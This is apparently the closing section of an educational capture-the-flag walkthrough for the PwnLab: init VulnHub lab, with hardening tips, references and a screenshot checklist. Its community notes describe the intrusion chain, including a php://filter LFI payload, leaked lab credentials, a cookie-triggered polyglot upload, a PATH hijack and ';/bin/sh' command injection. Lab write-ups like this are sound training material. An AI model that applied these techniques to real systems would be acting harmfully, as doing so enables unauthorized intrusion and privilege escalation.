- **Audit SUID binaries.** Remove unnecessary SUID bits, and always call external programs by absolute path. Avoid passing user input into a shell (`echo %s`) — use safe APIs.
- **Principle of least privilege** for the web user, and monitor for suspicious outbound connections (reverse shells connect out to the attacker).

## 7. References

Real community writeups consulted during research (same path):

- [PwnLab: init — seekorswim](https://seekorswim.github.io/walkthroughs/2019/05/21/pwnlab-init/)
- [PwnLab: init Writeup — IRONHACKERS](https://ironhackers.es/en/pwnlab-init-writeup-vulnhub/)
- [Vulnhub — PwnLab: init — joenibe](https://joenibe.github.io/vulnhub/pwnlab/)
- [PwnLab: Init – walkthrough — Reedphish](https://reedphish.wordpress.com/2016/09/17/pwnlab-init-walkthrough/)
- [CTF: PwnLab Init Walkthrough — mrjamiebowman](https://www.mrjamiebowman.com/pentest/parrotos/pwnlab-init-walkthrough/)
- [Vulnhub – PwnLab init — Ivan's IT learning blog](https://ivanitlearning.wordpress.com/2020/02/06/vulnhub-pwnlab-init/)
- [VulnHub Official Entry — PwnLab: init](https://vulnhub.com/entry/pwnlab-init,158/)

### Community notes — consensus, pitfalls and alternative routes

*(cross-checked against the sources below):*

- **Consensus chain:** LFI at `?page=` → `php://filter/convert.base64-encode/resource=config` → MySQL root `H4u%QJ_H99` on 3306 → dump `Users.users` → base64-decode → login → read `upload.php` via the filter → `GIF89a` polyglot `.gif` → execute via the `lang` cookie → `su kane` → `msgmike` PATH hijack → `mike` → `msg2root` command injection → root. All seven writeups cross-checked follow this chain; **none** needed Apache log poisoning (the `lang` cookie is a cleaner execution primitive than `access.log`).
- **Common pitfall:** the cookie must be `lang=../upload/<md5>.gif` — without `../` nothing executes; the GET `page` inclusion appends `.php`, so the `.gif` only ever fires through the cookie. Visiting the uploaded file directly only *downloads* it (static `.gif`, no PHP handler).
- **Common pitfall:** `su` fails with "must be run from a terminal" until you spawn a TTY (`python -c 'import pty; pty.spawn("/bin/bash")'` — `python`, not `python3`, on this box).
- **Common pitfall:** `export PATH=/home/kane` *replaces* PATH, so `cat`/`ls` disappear — prepend with `:$PATH` instead, and restore the full PATH afterwards; `;/bin/sh` works in `msg2root` where `bash -p` may not.
- **Common pitfall:** forget `chmod +x cat` and the shell silently skips your fake `cat` and falls back to the real one — you stay `kane` with no error message.
- **Alternative route:** the upload check only needs a real image MIME plus the magic header, so a `.png`/`.jpg` name works too (abatchy and CyberArri both uploaded a `GIF89a`-prefixed payload with a `.png` name and included it via the cookie); editing the cookie in Burp's proxy works wherever `curl -b` is awkward (reedphish, flikk, CyberArri).
- **Alternative route:** `msg2root` can be abused beyond `;/bin/sh` — flikk injected commands to `chown root` + `chmod u+s` a tiny compiled `setuid(0)` helper and ran that instead; abatchy used `opensesame; bash -p`.
- **Alternative route:** reversing `msgmike`/`msg2root` with **radare2** or **IDA** instead of `strings` (IRONHACKERS) — same conclusion, more tooling than a beginner needs.
- **Dead ends confirmed by multiple writeups:** SQLi on `login.php` (prepared statements — sqlmap reports nothing injectable); `kent`'s account (nothing interesting); `mike`'s DB password locally (does not work); an extra `john` account in `/home` (red herring); SSH (disabled); linpeas (no useful findings).
- **⚠️ Verification note:** the DB password strings differ between image revisions. This card keeps the values observed on the current lab image (`S0k3an1jZmFuc2tp`, `U2Ztb2RvbnM=`, `a2FuZQ==`); most writeups from 2016–2022 report `kent=Sld6WHVCSkpOeQ==`, `mike=U0lmZHNURW42SQ==`, `kane=aVN2NVltMkdSbw==` (→ `JWzXuBJJNy`, `SIfdsTEn6I`, `iSv5Ym2GRo`). The pattern — three users, base64 passwords — never changes.
- **⚠️ Verification note:** the card's port set (80, 111, 3306) is the operative one, but several scans in writeups also show one or two **extra high-numbered RPC `status` ports** (e.g. 49623, 58877, 60324) served by `rpcbind` on port 111. They are informational — no step of the chain needs them. Metadata (author Claor, released 1 Aug 2016, flag `/root/flag.txt`, OS Debian) is confirmed verbatim on the VulnHub entry.
- **Verified sources:** [abatchy](https://www.abatchy.com/2016/11/pwnlab-init-walkthrough-vulnhub) · [joenibe](https://joenibe.github.io/vulnhub/pwnlab/) · [IRONHACKERS](https://ironhackers.es/en/pwnlab-init-writeup-vulnhub/) · [reedphish](https://reedphish.wordpress.com/2016/09/17/pwnlab-init-walkthrough/) · [VulnHub entry](https://www.vulnhub.com/entry/pwnlab-init,158/) · [HackTricks — File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) · [CyberArri](https://cyberarri.com/2022/07/28/pwnlab-init/) · [flikk.blog](https://flikk.blog/2020/01/30/vulnhub-pwnlab-init/)


## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap scan showing ports 80, 111, 3306
- [ ] `images/03-lfi-config.png` — Base64-decoded `config.php` (DB credentials)
- [ ] `images/04-payload.png` — building the GIF+PHP reverse shell
- [ ] `images/05-wwwdata-shell.png` — reverse shell as `www-data`
- [ ] `images/06-root-flag.png` — root shell and `/root/flag.txt`

> **How to read it:** Put screenshots in `labs/3-057-pwnlab-init/images/` and reference them with relative paths as shown above.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
